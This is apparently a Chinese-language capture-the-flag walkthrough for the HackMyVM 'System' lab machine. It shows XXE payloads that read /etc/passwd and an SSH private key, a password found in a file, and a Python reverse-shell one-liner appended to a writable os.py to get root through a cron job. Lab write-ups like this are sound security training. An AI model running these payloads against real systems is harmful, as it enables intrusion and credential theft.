# System

2025.01.03 https://hackmyvm.eu/machines/machine.php?vm=System

## Ip

192.168.5.40

## Scan

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

80 web 服务首页是个注册页面，源码没看到什么信息。目录扫描 http://192.168.5.40/magic.php 但是没看到提交参数的地方。

首页是个注册页面，查看 http 提交请求，发现使用的是 xml，可能存在 xxe 漏洞，进行测试：

```
<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>

<details><email>&xxe;</email><password>1</password></details>
```

上面可以读取到 /etc/passwd 证明漏洞存在，并且发现用户 david。用 bp 跑一下 linux 常用文件字典，看看能读取到哪些文件。

最终读取到 david 用户的私钥文件：

```
<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/home/david/.ssh/id_rsa"> ]>

<details><email>&xxe;</email><password>1</password></details>
```

将得到的内容进行 base64 解码，但是用私钥登陆不上，继续爆一下/home/david 目录下有什么吧，发现 /home/david/.viminfo 中记录操作了一个文件，/usr/local/etc/mypass.txt 读取其内容发现了一个字符串，像是密码: h4ck3rd4v!d

尝试 ssh 登陆 david，登陆成功，获得了 user flag：

```
david@system:~$ cat user.txt
79f3964a3a0f1a050761017111efffe0
```

枚举其他信息，suid sudo crontab 都没发现什么，上传 pspy 看看后台有没有跑什么，发现： /bin/sh -c /usr/bin/python3.9 /opt/suid.py 读取其内容：

```
from os import system
from pathlib import Path

# Reading only first line
try:
    with open('/home/david/cmd.txt', 'r') as f:
        read_only_first_line = f.readline()
    # Write a new file
    with open('/tmp/suid.txt', 'w') as f:
        f.write(f"{read_only_first_line}")
    check = Path('/tmp/suid.txt')
    if check:
        print("File exists")
        try:
            os.system("chmod u+s /bin/bash")
        except NameError:
            print("Done")
    else:
        print("File not exists")
except FileNotFoundError:
```

根据上述 python 代码逻辑，发现 /usr/lib/python3.9/os.py 我们有权限可写，将反弹 shell 写入到其末尾：

```
echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.5.3",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' >> /usr/lib/python3.9/os.py
```

反弹后，得到了 root flag：

```
root@system:~# cat root.txt
cat root.txt
3aa26937ecfcc6f2ba466c14c89b92c4
```
